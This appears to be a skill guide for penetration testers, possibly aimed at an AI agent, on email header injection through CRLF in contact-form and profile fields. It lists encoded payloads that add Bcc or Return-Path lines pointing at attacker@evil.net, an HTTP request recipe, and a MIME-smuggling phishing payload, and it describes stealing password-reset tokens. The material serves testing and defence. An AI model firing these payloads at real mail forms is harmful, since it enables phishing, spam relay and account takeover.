---
name: email-header-injection
description: Email header injection — CRLF-based injection into mail headers via unsanitized recipient / subject / from / sender name fields, extending to Bcc addition, Content-Type manipulation for MIME attacks, mailer-service abuse, and Return-Path forgery
---

# Email Header Injection

Email header injection is the class where attacker-controlled text reaches a mail-message composer and the attacker injects `\r\n` sequences to add new mail headers or terminate the header section early. The primitive is **CRLF in a user field → attacker-authored mail headers injected into the outgoing message**: an unsanitized "name" field in a contact form reaches the `From:` header, lets the attacker add `Bcc: attacker@evil.net`, inject malicious `Content-Type: multipart/mixed; boundary=...` for MIME-smuggling attacks, forge `Return-Path:`, or terminate headers early with `\r\n\r\n` and prepend an attacker-authored message body. The question is never "does the application send email?" — it is "which user fields reach the composed headers unescaped?"

## Attack Surface

**Direct Mail Composition Paths**
- Contact forms with "name" / "email" / "subject" fields reaching the mail composer
- Password-reset flows that compose "forgot password" emails with user-controlled email
- Notification systems that use user-provided display names
- Self-service "share with a friend" email flows
- Comment-notification emails to blog authors
- Account-registration confirmation emails

**Mail Service Integration Paths**
- SMTP library wrappers (PHPMailer, Swift Mailer, Nodemailer, Python email.*, Apache Camel-Mail, java.mail)
- Transactional mail services (SendGrid, Mailgun, SES — the API-call-level composition can still carry CRLF)
- Mailer frameworks (Rails ActionMailer, Django EmailMessage, Laravel Mail)
- Mail-server-side (Postfix, Exim, Sendmail) configured with LDAP-mapped identifiers

**Downstream Consumers**
- Spam filtering (added `Bcc:` recipients may trigger spam-filter dark patterns)
- Mail routing (modified `Return-Path:` reaches an attacker-controlled bounce address)
- MIME parsing (injected `Content-Type: multipart/mixed; boundary=...` enables attacker-authored MIME parts)
- Address resolution (CRLF in `To:` adds additional recipients)

**Input Vectors**
- Form fields: name, email, subject, message, display_name, from_name
- URL parameters feeding mail-composer backends
- API fields (JSON/REST body fields feeding transactional email)
- OAuth / SAML / SSO integration fields (user-attribute → email composer)
- Second-order: profile fields stored and later used in notifications

## Core Primitive — CRLF in a Mail Header Field

**Primitive.** User input is inserted into a mail header without filtering `\r` or `\n`. Attacker's injection adds a new header after the attacker-chosen position.

**Attack recipe:**
```http
# Vulnerable contact form
POST /contact HTTP/1.1

name=Attacker%0D%0ABcc:+bcc@attacker.net&email=victim@target.com&message=hi
```

Server-side composition:
```
From: no-reply@target.com
Reply-To: Attacker
Bcc: bcc@attacker.net          <-- injected
To: victim@target.com
Subject: Contact Form
...
```

The `%0D%0A` (CRLF) terminates the `Reply-To:` value and starts a new `Bcc:` header. The outgoing message is delivered to both `victim@target.com` AND `bcc@attacker.net`.

**Payload family:**
| Payload | Injected header | Effect |
|---|---|---|
| `attacker%0D%0ABcc: attacker@evil.net` | `Bcc:` | Covert recipient |
| `attacker%0D%0ACc: attacker@evil.net` | `Cc:` | Visible added recipient |
| `attacker%0D%0AContent-Type: text/html` | `Content-Type:` | Switch to HTML body |
| `attacker%0D%0AReturn-Path: attacker@evil.net` | `Return-Path:` | Bounce routing |
| `attacker%0D%0A%0D%0ABODY` | header-terminator + body | Attacker-authored body prepended |
| `attacker%0D%0AContent-Type: multipart/mixed; boundary="X"%0D%0A%0D%0A--X%0D%0A...` | MIME multipart injection | Attacker-authored MIME parts |

## MIME-Smuggling via Content-Type Injection

**Primitive.** Attacker injects `Content-Type: multipart/mixed; boundary="X"` and then injects MIME boundaries to introduce attacker-authored message parts.

**Attack recipe:**
```
name=Attacker%0D%0AContent-Type:+multipart/mixed;+boundary=%22ATTACKER%22%0D%0A%0D%0A--ATTACKER%0D%0AContent-Type:+text/html%0D%0A%0D%0A<a+href=%22http://evil%22>Phishing</a>%0D%0A--ATTACKER--
```

Resulting message carries an HTML MIME part with attacker-authored content. If the receiving mail client renders the first MIME part preferentially (common), the victim sees attacker content.

## Return-Path and Envelope Forgery

**Primitive.** Modifying `Return-Path:` or `From:` can redirect bounce handling or appear as spoofed sender.

**Impact.** Bounce messages (sent on delivery failure) reach attacker; the From: may bypass SPF/DKIM checks depending on alignment configuration.

## Second-Order Email Header Injection

**Primitive.** User profile field (display name) is stored at registration without validation and later composed into a notification email header.

**Pattern.** The injection point is the profile-update endpoint; the trigger is a notification event (comment reply, mention, friend request). Finding attribution requires time-correlating the storage request with the subsequent email delivery.

## Detection Channels

### Direct Reflection

Submit `attacker\r\nX-Marker: TEST\r\n` as a form field; observe outgoing mail (if attacker-reachable mailbox is used as recipient) for an `X-Marker: TEST` header.

### Bcc Confirmation

Submit `attacker\r\nBcc: attacker@evil.net`; verify delivery to `attacker@evil.net` (an attacker-controlled mailbox).

### Error-Message Reflection

Some mail libraries reject malformed headers with a stack trace revealing the composed headers. A reflected error containing the injection confirms the sink.

## Testing Methodology

1. **Enumerate mail-composition sinks.** Grep for `PHPMailer`, `Swift_Message`, `Nodemailer`, `java.mail.MimeMessage`, `Django EmailMessage`, `ActionMailer`, `Laravel Mail`.
2. **Fire CRLF payloads at each form field.** `%0D%0A`-encoded injections; also test `%0A` (LF-only), `%0D` (CR-only), `%E2%80%A8` (U+2028 LINE SEPARATOR — Unicode newline that some normalizers accept).
3. **Confirm via Bcc delivery.** Attacker-controlled mailbox is the cleanest confirmation.
4. **Test for MIME-smuggling.** Inject `Content-Type: multipart/mixed; boundary=...` and attacker-authored parts.
5. **Match CVE anchors.** The novel sibling catalogs 2024-2026 CVEs.

## Validation

- **Delivery to attacker-controlled Bcc confirms the mechanism.** The outgoing message literally reached the injected address.
- **Reflected injection in a server-side error message is suggestive but not confirmation.** The message may not have been composed+sent; just stored or echoed.
- **Modified Return-Path requires observable bounce behavior.** Trigger a bounce (recipient-not-exist); observe the bounce destination.
- **MIME-smuggling confirmation.** Received message carries attacker-authored MIME part parsed by a mail client.

## False Positives

- A CRLF-reflected form field that does not actually reach mail composition (stored but not used).
- A rejection error from the mail library (library did detect the injection).
- A delivery to the recipient's mailbox without the injected addresses (library stripped the CRLF).

## Impact and Chaining

**Direct impact.**
- **Covert recipient.** Attacker receives copies of outgoing legitimate mail.
- **Spam / phishing distribution.** Attacker uses the target's mail server to send attacker-authored messages with trusted From domain.
- **Account-takeover via password-reset email.** Email with reset-token is also sent to attacker.
- **MIME-smuggling → phishing.** Mail recipient sees attacker-authored content as a legitimate message part.

**Upstream enablers.** Unvalidated form field reaching mail composition.

**Downstream.**
- `authentication_jwt.md` — password-reset token theft via Bcc.
- `header_injection.md` — the HTTP-level CRLF cousin; this skill is the mail-specific expression.
- `information_disclosure.md` — mail content exfil via covert recipient.
- `semantic_confusion.md` — MIME-smuggling as a semantic/parser-differential class.

**Composite chains.**
- *Email injection + password reset → account takeover.* Attacker triggers password reset; the reset email delivers to victim AND attacker via Bcc; attacker uses the token.
- *Email injection + spam-list enumeration.* Attacker observes which recipients the system can reach via Bcc delivery.

## Pro Tips

- **CRLF normalization varies.** Some libraries filter only `\r\n`, missing `\n` alone, `\r` alone, or Unicode newlines (U+2028, U+2029). Fuzz with the full newline family.
- **The injection surface is per-field.** Even a well-protected "email" field may have an adjacent "name" field that reaches the same header unescaped.
- **MIME smuggling is more impactful than Bcc.** A phishing MIME part sent via a trusted mail server bypasses SPF/DKIM for the attacker-authored content.
- **CakePHP CVE-2026-77634** shows that even current frameworks ship CRLF bugs — not just legacy code.
- **Apache Camel-Mail CVE-2026-33454** at CVSS 9.4 is MessageHeaderFilterStrategy-related; integration ESBs reach broad impact.

## Tooling

- **Burp Suite** — fire CRLF payloads via Repeater; use Collaborator as the Bcc recipient.
- **Mailpit, MailHog** — local SMTP server for confirmation testing.
- **swaks** — SMTP command-line client for direct message replay.
- **PHPMailer / Swift Mailer local test harness** — reproduce payloads against pinned library versions.

## Summary

Email header injection is CRLF-based injection into mail-message headers. The primitive is attacker-authored additional headers (Bcc, Cc, Content-Type, Return-Path), header-terminator + attacker-authored body, or MIME-smuggling via Content-Type multipart boundary injection. The 2024-2026 frontier covers 13+ CVEs including Apache Camel-Mail (CVE-2026-33454 CVSS 9.4), @perfood/couch-auth (CVE-2025-70948 CVSS 9.3), Mailpit (CVE-2026-23829), MimeKit (CVE-2026-30227), wpDiscuz (CVE-2026-22204), Essential Addons for Elementor (CVE-2026-15155 CVSS 8.8), CakePHP (CVE-2026-77634), MyBB (CVE-2026-45125). This class is bounded — the primitive surface is narrower than SQLi or XSS — but each primitive is distinct and reaches high-impact outcomes (account takeover via password-reset Bcc, phishing via spoofed trusted sender). The two deep siblings carry the full technique surface: `email_header_injection_advanced_deep.md` owns per-library escape behavior and MIME-smuggling depth; `email_header_injection_novel_deep.md` owns the 2024-2026 CVE catalogue.
